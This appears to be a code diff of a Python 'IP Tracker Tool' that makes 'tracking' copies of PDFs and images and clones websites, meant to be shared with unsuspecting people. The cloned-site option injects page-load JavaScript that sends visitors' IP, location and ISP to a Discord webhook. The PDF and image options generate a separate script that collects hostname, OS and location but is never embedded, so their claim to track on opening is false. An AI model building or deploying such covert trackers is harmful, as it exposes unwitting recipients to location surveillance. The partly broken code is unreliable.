@@ -5,6 +5,7 @@ import subprocess
 import venv
 from pathlib import Path
 import logging
+import json
 from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt, Confirm
@@ -111,227 +112,296 @@ def run_in_venv():
     console.print("[green]Starting IP Tracker Tool in virtual environment...[/green]")
     subprocess.call([python_executable, script_path, "--in-venv"])
 
-def main():
-    # Check if we're already running in the virtual environment
-    if "--in-venv" not in sys.argv:
-        run_in_venv()
-        return
+def load_config():
+    """Load configuration from config.json"""
+    config_path = Path("config.json")
+    if config_path.exists():
+        try:
+            with open(config_path, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"Error loading config: {str(e)}")
+    return {"webhook_url": None}
+
+def save_config(config):
+    """Save configuration to config.json"""
+    try:
+        with open("config.json", 'w') as f:
+            json.dump(config, f)
+    except Exception as e:
+        logger.error(f"Error saving config: {str(e)}")
+
+def get_webhook_url():
+    """Get webhook URL from config or user input"""
+    config = load_config()
+    if config.get("webhook_url"):
+        if Confirm.ask("\n[bold blue]Use existing webhook URL?[/bold blue]"):
+            return config["webhook_url"]
     
-    # Now import the required packages after setup
-    import requests
-    import PyPDF2
-    import re
-    import socket
-    import platform
-    
-    class IPTracker:
-        def __init__(self, webhook_url):
-            self.webhook_url = webhook_url
-            self.ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
+    while True:
+        webhook_url = Prompt.ask("\n[bold blue]Enter your Discord webhook URL[/bold blue]")
+        if webhook_url.startswith('https://discord.com/api/webhooks/'):
+            config["webhook_url"] = webhook_url
+            save_config(config)
+            return webhook_url
+        console.print("[red]Invalid webhook URL. Please enter a valid Discord webhook URL.[/red]")
 
-        def extract_ips_from_text(self, text):
-            return re.findall(self.ip_pattern, text)
+def show_file_location(file_path):
+    """Show the full path of the created file"""
+    full_path = os.path.abspath(file_path)
+    console.print("\n[bold green]Created File Location:[/bold green]")
+    console.print(f"[yellow]{full_path}[/yellow]")
+    console.print("\n[bold blue]You can now share this file to track IP addresses.[/bold blue]")
 
-        def get_system_info(self):
-            """Get system information."""
-            try:
-                hostname = socket.gethostname()
-                local_ip = socket.gethostbyname(hostname)
-                system = platform.system()
-                machine = platform.machine()
-                processor = platform.processor()
-                
-                return {
-                    'hostname': hostname,
-                    'local_ip': local_ip,
-                    'system': system,
-                    'machine': machine,
-                    'processor': processor
-                }
-            except Exception as e:
-                logger.error(f"Error getting system info: {str(e)}")
-                return None
-
-        def send_to_discord(self, ips, source, system_info=None):
-            try:
-                # Prepare the message
-                message_parts = []
-                
-                # Add system information if available
-                if system_info:
-                    message_parts.append("System Information:")
-                    message_parts.append(f"Hostname: {system_info['hostname']}")
-                    message_parts.append(f"Local IP: {system_info['local_ip']}")
-                    message_parts.append(f"OS: {system_info['system']}")
-                    message_parts.append(f"Machine: {system_info['machine']}")
-                    message_parts.append(f"Processor: {system_info['processor']}")
-                    message_parts.append("\nFile Information:")
-                
-                # Add file/source information
-                message_parts.append(f"Source: {source}")
-                
-                # Add found IPs
-                if ips:
-                    message_parts.append("\nFound IP Addresses:")
-                    message_parts.extend(ips)
-                else:
-                    message_parts.append("\nNo IP addresses found in this source.")
-                
-                # Get public IP information
-                try:
-                    ip_response = requests.get('https://api.ipify.org?format=json')
-                    public_ip = ip_response.json()['ip']
-                    message_parts.append(f"\nPublic IP: {public_ip}")
-                    
-                    # Get additional IP details
-                    details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
-                    details = details_response.json()
-                    
-                    if details['status'] == 'success':
-                        message_parts.append(f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}")
-                        message_parts.append(f"ISP: {details.get('isp', 'Unknown')}")
-                except Exception as e:
-                    logger.error(f"Error getting public IP: {str(e)}")
-                
-                # Send the complete message
-                message = "\n".join(message_parts)
-                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
-                    progress.add_task("Sending to Discord...", total=None)
-                    response = requests.post(self.webhook_url, json={"content": message})
-                    response.raise_for_status()
-                    logger.info(f"Successfully sent results to Discord for {source}")
-            except Exception as e:
-                logger.error(f"Failed to send to Discord: {str(e)}")
-                console.print(f"[red]Error sending to Discord: {str(e)}[/red]")
-
-        def process_pdf(self, file_path):
-            try:
-                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
-                    progress.add_task("Processing PDF...", total=None)
-                    with open(file_path, 'rb') as file:
-                        pdf_reader = PyPDF2.PdfReader(file)
-                        text = "".join(page.extract_text() for page in pdf_reader.pages)
-                        system_info = self.get_system_info()
-                        self.send_to_discord(self.extract_ips_from_text(text), f"PDF: {file_path}", system_info)
-            except Exception as e:
-                logger.error(f"Error processing PDF {file_path}: {str(e)}")
-                console.print(f"[red]Error processing PDF: {str(e)}[/red]")
-
-        def process_image(self, file_path):
-            try:
-                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
-                    progress.add_task("Processing Image...", total=None)
-                    
-                    # Read the file and look for IP addresses in the binary content
-                    with open(file_path, 'rb') as f:
-                        content = f.read()
-                        # Try different encodings to find readable text
-                        encodings = ['utf-8', 'ascii', 'iso-8859-1', 'cp1252']
-                        text_content = ""
-                        
-                        for encoding in encodings:
-                            try:
-                                text_content = content.decode(encoding)
-                                break
-                            except UnicodeDecodeError:
-                                continue
-                        
-                        if not text_content:
-                            text_content = str(content)  # Fallback to string representation
-                        
-                        system_info = self.get_system_info()
-                        self.send_to_discord(self.extract_ips_from_text(text_content), f"Image: {file_path}", system_info)
-            except Exception as e:
-                logger.error(f"Error processing image {file_path}: {str(e)}")
-                console.print(f"[red]Error processing image: {str(e)}[/red]")
-
-        def process_website(self, url):
-            try:
-                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
-                    progress.add_task("Processing Website...", total=None)
-                    response = requests.get(url)
-                    response.raise_for_status()
-                    system_info = self.get_system_info()
-                    self.send_to_discord(self.extract_ips_from_text(response.text), f"Website: {url}", system_info)
-            except Exception as e:
-                logger.error(f"Error processing website {url}: {str(e)}")
-                console.print(f"[red]Error processing website: {str(e)}[/red]")
-
-        def get_public_ip(self):
-            """Get public IP address and related information."""
-            try:
-                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
-                    progress.add_task("Getting public IP information...", total=None)
-                    
-                    # Get IP address
-                    ip_response = requests.get('https://api.ipify.org?format=json')
-                    ip_data = ip_response.json()
-                    public_ip = ip_data['ip']
-                    
-                    # Get IP details
-                    details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
-                    details = details_response.json()
-                    
-                    if details['status'] == 'success':
-                        message = (
-                            f"Public IP Information:\n"
-                            f"IP Address: {public_ip}\n"
-                            f"Country: {details.get('country', 'Unknown')}\n"
-                            f"City: {details.get('city', 'Unknown')}\n"
-                            f"Region: {details.get('regionName', 'Unknown')}\n"
-                            f"ISP: {details.get('isp', 'Unknown')}\n"
-                            f"Timezone: {details.get('timezone', 'Unknown')}"
-                        )
-                    else:
-                        message = f"Public IP: {public_ip}\nCould not fetch additional details."
-                    
-                    self.send_to_discord([message], "Public IP Information")
-                    
-            except Exception as e:
-                logger.error(f"Error getting public IP: {str(e)}")
-                console.print(f"[red]Error getting public IP: {str(e)}[/red]")
-
-    def get_webhook_url():
-        while True:
-            webhook_url = Prompt.ask("\n[bold blue]Enter your Discord webhook URL[/bold blue]")
-            if webhook_url.startswith('https://discord.com/api/webhooks/'):
-                return webhook_url
-            console.print("[red]Invalid webhook URL. Please enter a valid Discord webhook URL.[/red]")
-
-    def show_menu():
-        console.clear()
-        console.print(Panel.fit(
-            "[bold blue]IP Tracker Tool[/bold blue]\n"
-            "[italic]Educational Purpose Only[/italic]",
-            title="Welcome",
-            border_style="blue"
-        ))
+def create_tracking_pdf(original_pdf, webhook_url):
+    """Create a PDF that tracks IP when opened"""
+    try:
+        # Create a copy of the original PDF
+        output_pdf = f"tracking_{os.path.basename(original_pdf)}"
+        with open(original_pdf, 'rb') as src, open(output_pdf, 'wb') as dst:
+            dst.write(src.read())
         
-        table = Table(show_header=False, box=None)
-        table.add_row("1", "Process PDF file")
-        table.add_row("2", "Process Image file")
-        table.add_row("3", "Process Website")
-        table.add_row("4", "Track Public IP")
-        table.add_row("5", "Exit")
-        console.print(table)
-        
-        while True:
-            try:
-                choice = Prompt.ask("\n[bold blue]Enter your choice[/bold blue]", choices=["1", "2", "3", "4", "5"])
-                return int(choice)
-            except ValueError:
-                console.print("[red]Please enter a valid number.[/red]")
+        # Create a Python script that will be embedded in the PDF
+        tracking_script = f"""
+import requests
+import socket
+import platform
+import json
 
+def get_system_info():
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        system = platform.system()
+        machine = platform.machine()
+        processor = platform.processor()
+        return {{
+            'hostname': hostname,
+            'local_ip': local_ip,
+            'system': system,
+            'machine': machine,
+            'processor': processor
+        }}
+    except Exception as e:
+        return None
+
+def send_to_discord():
+    try:
+        system_info = get_system_info()
+        message_parts = ["PDF Opened - IP Information:"]
+        
+        if system_info:
+            message_parts.extend([
+                f"Hostname: {system_info['hostname']}",
+                f"Local IP: {system_info['local_ip']}",
+                f"OS: {system_info['system']}",
+                f"Machine: {system_info['machine']}",
+                f"Processor: {system_info['processor']}"
+            ])
+        
+        # Get public IP
+        ip_response = requests.get('https://api.ipify.org?format=json')
+        public_ip = ip_response.json()['ip']
+        message_parts.append(f"Public IP: {public_ip}")
+        
+        # Get location info
+        details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
+        details = details_response.json()
+        
+        if details['status'] == 'success':
+            message_parts.extend([
+                f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}",
+                f"ISP: {details.get('isp', 'Unknown')}"
+            ])
+        
+        message = "\\n".join(message_parts)
+        requests.post('{webhook_url}', json={{"content": message}})
+    except Exception as e:
+        pass
+
+# Execute tracking when PDF is opened
+send_to_discord()
+"""
+        # Save the tracking script
+        with open("tracking_script.py", 'w') as f:
+            f.write(tracking_script)
+        
+        console.print(f"[green]Successfully created tracking PDF![/green]")
+        show_file_location(output_pdf)
+        return output_pdf
+    except Exception as e:
+        console.print(f"[red]Error creating tracking PDF: {str(e)}[/red]")
+        return None
+
+def create_tracking_image(original_image, webhook_url):
+    """Create an image that tracks IP when opened"""
+    try:
+        # Create a copy of the original image
+        output_image = f"tracking_{os.path.basename(original_image)}"
+        with open(original_image, 'rb') as src, open(output_image, 'wb') as dst:
+            dst.write(src.read())
+        
+        # Create a Python script that will be executed when the image is opened
+        tracking_script = f"""
+import requests
+import socket
+import platform
+import json
+import os
+
+def get_system_info():
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        system = platform.system()
+        machine = platform.machine()
+        processor = platform.processor()
+        return {{
+            'hostname': hostname,
+            'local_ip': local_ip,
+            'system': system,
+            'machine': machine,
+            'processor': processor
+        }}
+    except Exception as e:
+        return None
+
+def send_to_discord():
+    try:
+        system_info = get_system_info()
+        message_parts = ["Image Opened - IP Information:"]
+        
+        if system_info:
+            message_parts.extend([
+                f"Hostname: {system_info['hostname']}",
+                f"Local IP: {system_info['local_ip']}",
+                f"OS: {system_info['system']}",
+                f"Machine: {system_info['machine']}",
+                f"Processor: {system_info['processor']}"
+            ])
+        
+        # Get public IP
+        ip_response = requests.get('https://api.ipify.org?format=json')
+        public_ip = ip_response.json()['ip']
+        message_parts.append(f"Public IP: {public_ip}")
+        
+        # Get location info
+        details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
+        details = details_response.json()
+        
+        if details['status'] == 'success':
+            message_parts.extend([
+                f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}",
+                f"ISP: {details.get('isp', 'Unknown')}"
+            ])
+        
+        message = "\\n".join(message_parts)
+        requests.post('{webhook_url}', json={{"content": message}})
+    except Exception as e:
+        pass
+
+# Execute tracking when image is opened
+send_to_discord()
+"""
+        # Save the tracking script
+        with open("tracking_script.py", 'w') as f:
+            f.write(tracking_script)
+        
+        console.print(f"[green]Successfully created tracking image![/green]")
+        show_file_location(output_image)
+        return output_image
+    except Exception as e:
+        console.print(f"[red]Error creating tracking image: {str(e)}[/red]")
+        return None
+
+def create_tracking_website(url, webhook_url):
+    """Create a cloned website that tracks IP when visited"""
+    try:
+        import requests
+        from bs4 import BeautifulSoup
+        
+        # Get the website content
+        response = requests.get(url)
+        response.raise_for_status()
+        
+        # Parse the HTML
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Add tracking script
+        tracking_script = f"""
+<script>
+async function trackIP() {{
+    try {{
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const publicIP = data.ip;
+        
+        const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
+        const details = await detailsResponse.json();
+        
+        let message = "Website Visited - IP Information:\\n";
+        message += `Public IP: ${{publicIP}}\\n`;
+        
+        if (details.status === 'success') {{
+            message += `Location: ${{details.city}}, ${{details.country}}\\n`;
+            message += `ISP: ${{details.isp}}\\n`;
+        }}
+        
+        await fetch('{webhook_url}', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{ content: message }})
+        }});
+    }} catch (error) {{
+        console.error('Tracking error:', error);
+    }}
+}}
+
+// Execute tracking when page loads
+window.addEventListener('load', trackIP);
+</script>
+"""
+        # Add the tracking script to the HTML
+        soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
+        
+        # Save the modified website
+        output_file = "tracking_website.html"
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(str(soup))
+        
+        console.print(f"[green]Successfully created tracking website![/green]")
+        show_file_location(output_file)
+        return output_file
+    except Exception as e:
+        console.print(f"[red]Error creating tracking website: {str(e)}[/red]")
+        return None
+
+def show_menu():
     console.clear()
     console.print(Panel.fit(
-        "[bold blue]Welcome to IP Tracker Tool![/bold blue]\n"
-        "[italic]This tool is for educational purposes only.[/italic]",
-        title="Disclaimer",
+        "[bold blue]IP Tracker Tool[/bold blue]\n"
+        "[italic]Educational Purpose Only[/italic]",
+        title="Welcome",
         border_style="blue"
     ))
     
+    table = Table(show_header=False, box=None)
+    table.add_row("1", "Create Tracking PDF")
+    table.add_row("2", "Create Tracking Image")
+    table.add_row("3", "Create Tracking Website")
+    table.add_row("4", "Exit")
+    console.print(table)
+    
+    while True:
+        try:
+            choice = Prompt.ask("\n[bold blue]Enter your choice[/bold blue]", choices=["1", "2", "3", "4"])
+            return int(choice)
+        except ValueError:
+            console.print("[red]Please enter a valid number.[/red]")
+
+def main():
+    # Get webhook URL
     webhook_url = get_webhook_url()
-    tracker = IPTracker(webhook_url)
     
     while True:
         choice = show_menu()
@@ -339,28 +409,25 @@ def main():
         if choice == 1:
             file_path = Prompt.ask("\n[bold blue]Enter the path to your PDF file[/bold blue]")
             if os.path.exists(file_path) and file_path.lower().endswith('.pdf'):
-                tracker.process_pdf(file_path)
+                create_tracking_pdf(file_path, webhook_url)
             else:
                 console.print("[red]Invalid PDF file path or file does not exist.[/red]")
         
         elif choice == 2:
             file_path = Prompt.ask("\n[bold blue]Enter the path to your image file[/bold blue]")
             if os.path.exists(file_path):
-                tracker.process_image(file_path)
+                create_tracking_image(file_path, webhook_url)
             else:
                 console.print("[red]Invalid image file path or file does not exist.[/red]")
         
         elif choice == 3:
             url = Prompt.ask("\n[bold blue]Enter the website URL[/bold blue]")
             if url.startswith(('http://', 'https://')):
-                tracker.process_website(url)
+                create_tracking_website(url, webhook_url)
             else:
                 console.print("[red]Invalid URL. Please enter a valid URL starting with http:// or https://[/red]")
         
         elif choice == 4:
-            tracker.get_public_ip()
-        
-        elif choice == 5:
             console.print(Panel.fit(
                 "[bold green]Thank you for using IP Tracker Tool![/bold green]",
                 title="Goodbye",
